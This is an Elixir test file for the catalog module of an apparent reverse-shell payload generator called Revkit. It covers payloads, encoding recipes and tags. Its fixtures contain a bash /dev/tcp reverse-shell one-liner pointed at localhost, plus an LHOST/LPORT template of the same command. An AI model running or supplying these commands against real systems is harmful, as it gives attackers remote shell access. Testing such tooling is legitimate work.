defmodule Revkit.CatalogTest do
  use Revkit.DataCase, async: false

  alias Revkit.Catalog
  alias Revkit.Catalog.{Payload, Recipe, Tag}

  @payload_attrs %{
    name: "Bash TCP",
    template: "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"
  }

  describe "payloads" do
    test "create_payload/1 persists a payload" do
      assert {:ok, %Payload{} = payload} = Catalog.create_payload(@payload_attrs)

      assert payload.name == "Bash TCP"
      assert payload.template == @payload_attrs.template
      assert payload.description == nil
      assert payload.recipe_id == nil
    end

    test "create_payload/1 validates required fields" do
      assert {:error, changeset} = Catalog.create_payload(%{})
      assert %{name: ["can't be blank"], template: ["can't be blank"]} = errors_on(changeset)
    end

    test "list_payloads/0 orders by name and preloads tags" do
      {:ok, _payload} = Catalog.create_payload(%{name: "Zeta", template: "z"})
      {:ok, payload} = Catalog.create_payload(%{name: "Alpha", template: "a"})
      {:ok, tag} = Catalog.create_tag(%{name: "unix"})
      {:ok, _payload} = Catalog.put_payload_tags(payload, [tag.id])

      payloads = Catalog.list_payloads()

      assert Enum.map(payloads, & &1.name) == ["Alpha", "Zeta"]
      assert Enum.all?(payloads, &Ecto.assoc_loaded?(&1.tags))
      assert hd(payloads).tags == [tag]
    end

    test "get_payload/1 and get_payload!/1 preload associations" do
      {:ok, payload} = Catalog.create_payload(@payload_attrs)

      assert Catalog.get_payload(payload.id).id == payload.id
      assert Ecto.assoc_loaded?(Catalog.get_payload!(payload.id).tags)
      assert Catalog.get_payload(-1) == nil
    end

    test "update_payload/2 updates a payload" do
      {:ok, payload} = Catalog.create_payload(@payload_attrs)

      assert {:ok, updated} = Catalog.update_payload(payload, %{name: "Renamed"})
      assert updated.name == "Renamed"
    end

    test "delete_payload/1 deletes a payload" do
      {:ok, payload} = Catalog.create_payload(@payload_attrs)

      assert {:ok, _payload} = Catalog.delete_payload(payload)
      assert Catalog.get_payload(payload.id) == nil
    end

    test "put_payload_tags/2 replaces the payload's tags" do
      {:ok, payload} = Catalog.create_payload(@payload_attrs)
      {:ok, unix} = Catalog.create_tag(%{name: "unix"})
      {:ok, linux} = Catalog.create_tag(%{name: "linux"})

      assert {:ok, tagged} = Catalog.put_payload_tags(payload, [unix.id, linux.id])
      assert tagged.tags |> Enum.map(& &1.name) |> Enum.sort() == ["linux", "unix"]

      assert {:ok, untagged} = Catalog.put_payload_tags(tagged, [])
      assert untagged.tags == []
    end

    test "put_payload_tags/2 rejects unknown tag ids" do
      {:ok, payload} = Catalog.create_payload(@payload_attrs)

      assert {:error, changeset} = Catalog.put_payload_tags(payload, [999_999])
      assert %{tags: ["reference unknown tags"]} = errors_on(changeset)
    end

    test "create_payload_with_tags/2 creates missing tags and reuses existing ones" do
      assert {:ok, payload} = Catalog.create_payload_with_tags(@payload_attrs, "unix, linux")

      assert payload.tags |> Enum.map(& &1.name) |> Enum.sort() == ["linux", "unix"]
      assert length(Catalog.list_tags()) == 2

      assert {:ok, other} =
               Catalog.create_payload_with_tags(%{name: "Other", template: "x"}, ["unix"])

      assert [%Tag{name: "unix"}] = other.tags
      assert length(Catalog.list_tags()) == 2
    end

    test "update_payload_with_tags/3 replaces tags and normalizes names" do
      {:ok, payload} = Catalog.create_payload_with_tags(@payload_attrs, ["unix"])

      assert {:ok, updated} =
               Catalog.update_payload_with_tags(payload, %{name: "Renamed"}, [
                 " linux ",
                 "",
                 "linux",
                 "web"
               ])

      assert updated.name == "Renamed"
      assert updated.tags |> Enum.map(& &1.name) |> Enum.sort() == ["linux", "web"]
    end

    test "create_payload_with_tags/2 rolls back the payload when a tag is invalid" do
      long_name = String.duplicate("a", 41)

      assert {:error, changeset} = Catalog.create_payload_with_tags(@payload_attrs, [long_name])
      assert %{name: [message]} = errors_on(changeset)
      assert message =~ "at most 40"

      assert Catalog.list_payloads() == []
      assert Catalog.list_tags() == []
    end

    test "create_payload/1 persists target metadata, notes, and favorite status" do
      attrs =
        Map.merge(@payload_attrs, %{
          target_os: "linux",
          target_shell: "bash",
          target_tools: ["base64", "curl"],
          notes: "Requires an interactive shell",
          favorite: true
        })

      assert {:ok, %Payload{} = payload} = Catalog.create_payload(attrs)

      assert payload.target_os == "linux"
      assert payload.target_shell == "bash"
      assert payload.target_tools == ["base64", "curl"]
      assert payload.notes == "Requires an interactive shell"
      assert payload.favorite == true
    end

    test "search_payloads/2 filters favorites and tags" do
      {:ok, favorite} =
        Catalog.create_payload_with_tags(
          %{name: "Favorite Linux", template: "id", favorite: true},
          ["linux"]
        )

      {:ok, _other} =
        Catalog.create_payload_with_tags(%{name: "Other", template: "id"}, ["windows"])

      assert [%{id: id}] = Catalog.search_payloads("", favorite: true)
      assert id == favorite.id

      [linux] = Enum.filter(Catalog.list_tags(), &(&1.name == "linux"))
      assert [%{id: ^id}] = Catalog.search_payloads("", tag_id: linux.id)
    end

    test "search_payloads/1 matches name, description, and template" do
      {:ok, _payload} =
        Catalog.create_payload(%{
          name: "Alpha shell",
          description: "interactive",
          template: "bash -i"
        })

      {:ok, _payload} =
        Catalog.create_payload(%{name: "Beta", description: "quiet", template: "nc"})

      assert Enum.map(Catalog.search_payloads("alpha"), & &1.name) == ["Alpha shell"]
      assert Enum.map(Catalog.search_payloads("interactive"), & &1.name) == ["Alpha shell"]
      assert Enum.map(Catalog.search_payloads("NC"), & &1.name) == ["Beta"]
      assert Catalog.search_payloads("missing") == []
    end

    test "toggle_payload_favorite/1 flips the flag" do
      {:ok, payload} = Catalog.create_payload(@payload_attrs)

      assert {:ok, favorited} = Catalog.toggle_payload_favorite(payload)
      assert favorited.favorite == true

      assert {:ok, unfavorited} = Catalog.toggle_payload_favorite(favorited)
      assert unfavorited.favorite == false
    end
  end

  describe "recipes" do
    test "create_recipe/1 normalizes and stores ordered steps" do
      attrs = %{
        name: "Wrap then encode",
        steps: [
          %{key: :bash_wrapper, options: %{}},
          %{"key" => "base64_encode", "options" => %{padding: true}}
        ]
      }

      assert {:ok, %Recipe{} = recipe} = Catalog.create_recipe(attrs)

      assert recipe.steps == [
               %{"key" => "bash_wrapper", "options" => %{}},
               %{"key" => "base64_encode", "options" => %{"padding" => true}}
             ]

      assert Catalog.get_recipe!(recipe.id).steps == recipe.steps
    end

    test "create_recipe/1 stores a full generation snapshot" do
      attrs = %{
        name: "Bash snapshot",
        template: "bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1",
        variables: %{"LHOST" => "127.0.0.1", "LPORT" => "4444"},
        steps: [%{"key" => "base64_encode", "options" => %{}}],
        notes: "Requires bash",
        favorite: true,
        target_os: "linux",
        target_shell: "bash",
        target_tools: ["bash"]
      }

      assert {:ok, %Recipe{} = recipe} = Catalog.create_recipe(attrs)

      assert recipe.template == attrs.template
      assert recipe.variables == attrs.variables
      assert recipe.notes == "Requires bash"
      assert recipe.favorite == true
      assert recipe.target_os == "linux"
      assert recipe.target_shell == "bash"
      assert recipe.target_tools == ["bash"]

      loaded = Catalog.get_recipe!(recipe.id)
      assert loaded.template == attrs.template
      assert loaded.variables == attrs.variables
    end

    test "fork_recipe/1 copies the snapshot and tags" do
      {:ok, payload} = Catalog.create_payload(%{name: "Source", template: "id"})

      {:ok, recipe} =
        Catalog.create_recipe(%{
          name: "Original",
          template: "bash -i",
          variables: %{"LHOST" => "127.0.0.1"},
          steps: [%{"key" => "bash_wrapper", "options" => %{}}],
          notes: "note",
          favorite: true,
          target_os: "linux",
          target_shell: "bash",
          payload_id: payload.id
        })

      {:ok, _recipe} = Catalog.put_recipe_tag_names(recipe, ["unix"])

      assert {:ok, forked} = Catalog.fork_recipe(Catalog.get_recipe!(recipe.id))

      assert forked.name == "Original (copy)"
      assert forked.template == "bash -i"
      assert forked.variables == %{"LHOST" => "127.0.0.1"}
      assert forked.steps == [%{"key" => "bash_wrapper", "options" => %{}}]
      assert forked.notes == "note"
      assert forked.favorite == true
      assert forked.target_shell == "bash"
      assert forked.payload_id == payload.id
      assert Enum.map(forked.tags, & &1.name) == ["unix"]
    end

    test "search_recipes/1 matches snapshot fields" do
      {:ok, _recipe} =
        Catalog.create_recipe(%{
          name: "Linux shell",
          template: "bash -i",
          notes: "interactive"
        })

      {:ok, _recipe} = Catalog.create_recipe(%{name: "Other", template: "cmd.exe"})

      assert Enum.map(Catalog.search_recipes("linux"), & &1.name) == ["Linux shell"]
      assert Enum.map(Catalog.search_recipes("interactive"), & &1.name) == ["Linux shell"]
      assert Enum.map(Catalog.search_recipes("CMD"), & &1.name) == ["Other"]
    end

    test "toggle_recipe_favorite/1 flips the flag" do
      {:ok, recipe} = Catalog.create_recipe(%{name: "Recipe"})

      assert {:ok, favorited} = Catalog.toggle_recipe_favorite(recipe)
      assert favorited.favorite == true

      assert {:ok, unfavorited} = Catalog.toggle_recipe_favorite(favorited)
      assert unfavorited.favorite == false
    end

    test "create_recipe_with_tags/2 rolls back when a tag is invalid" do
      long_name = String.duplicate("a", 41)

      assert {:error, changeset} = Catalog.create_recipe_with_tags(%{name: "Recipe"}, [long_name])
      assert %{name: [message]} = errors_on(changeset)
      assert message =~ "at most 40"
      assert Catalog.list_recipes() == []
    end

    test "create_recipe/1 defaults steps to an empty list" do
      assert {:ok, %Recipe{steps: []}} = Catalog.create_recipe(%{name: "Empty"})
    end

    test "create_recipe/1 rejects malformed steps" do
      assert {:error, changeset} =
               Catalog.create_recipe(%{name: "Bad", steps: [%{"key" => ""}]})

      assert %{steps: [message]} = errors_on(changeset)
      assert message =~ "options map"
    end

    test "list_recipes/0 orders by name" do
      {:ok, _recipe} = Catalog.create_recipe(%{name: "Zeta"})
      {:ok, _recipe} = Catalog.create_recipe(%{name: "Alpha"})

      assert Enum.map(Catalog.list_recipes(), & &1.name) == ["Alpha", "Zeta"]
    end

    test "update_recipe/2 and delete_recipe/1" do
      {:ok, recipe} = Catalog.create_recipe(%{name: "Original"})

      assert {:ok, updated} = Catalog.update_recipe(recipe, %{name: "Renamed"})
      assert updated.name == "Renamed"

      assert {:ok, _recipe} = Catalog.delete_recipe(updated)
      assert Catalog.get_recipe(recipe.id) == nil
    end

    test "delete_recipe/1 clears the recipe id on related payloads" do
      {:ok, recipe} = Catalog.create_recipe(%{name: "Recipe"})

      {:ok, payload} =
        Catalog.create_payload(Map.put(@payload_attrs, :recipe_id, recipe.id))

      assert payload.recipe_id == recipe.id

      assert {:ok, _recipe} = Catalog.delete_recipe(recipe)
      assert Catalog.get_payload!(payload.id).recipe_id == nil
    end
  end

  describe "tags" do
    test "create_tag/1 trims whitespace" do
      assert {:ok, %Tag{name: "unix"}} = Catalog.create_tag(%{name: "  unix  "})
    end

    test "create_tag/1 enforces unique names" do
      {:ok, _tag} = Catalog.create_tag(%{name: "unix"})

      assert {:error, changeset} = Catalog.create_tag(%{name: "unix"})
      assert %{name: ["has already been taken"]} = errors_on(changeset)
    end

    test "create_tag/1 validates the name" do
      assert {:error, changeset} = Catalog.create_tag(%{name: "   "})
      assert %{name: ["can't be blank"]} = errors_on(changeset)
    end

    test "list_tags/0 orders by name" do
      {:ok, _tag} = Catalog.create_tag(%{name: "zeta"})
      {:ok, _tag} = Catalog.create_tag(%{name: "alpha"})

      assert Enum.map(Catalog.list_tags(), & &1.name) == ["alpha", "zeta"]
    end

    test "delete_tag/1 removes the tag from payloads" do
      {:ok, payload} = Catalog.create_payload(@payload_attrs)
      {:ok, unix} = Catalog.create_tag(%{name: "unix"})
      {:ok, linux} = Catalog.create_tag(%{name: "linux"})
      {:ok, _payload} = Catalog.put_payload_tags(payload, [unix.id, linux.id])

      assert {:ok, _tag} = Catalog.delete_tag(unix)

      assert Catalog.get_payload!(payload.id).tags |> Enum.map(& &1.id) == [linux.id]
    end
  end
end
